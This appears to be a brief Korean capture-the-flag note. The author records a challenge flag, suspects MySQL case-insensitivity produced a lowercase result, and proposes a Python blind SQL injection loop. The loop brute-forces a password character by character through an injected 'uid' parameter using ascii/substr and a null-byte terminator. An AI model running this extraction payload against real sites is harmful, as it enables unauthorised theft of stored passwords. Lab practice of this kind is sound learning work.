프로그람의 출력은 dh{...}이였다.
MySQL에서 대소문자를 구분하지 않은게 원인이라고 생각한다.
확인이 필요함

DH{d3def39496c4153942f3f7d5451a4b98c6db1664}


아래의 방법을 쓰면 대소문자가 메대로 나오겠는지.
def find_pw(len):
    global pw
    for i in (range(1, len + 1)):
        for j in (range(32, 127 + 1)):
            payload = f"'||(ascii(substr(upw,{i},1)))like({j});%00"
            param = {'uid' : payload}
            r = requests.get(url, params = param)

            if r.text.__contains__('admin'):
                pw += chr(j)           
                break
    
    print(f'[+] Password = {pw}')
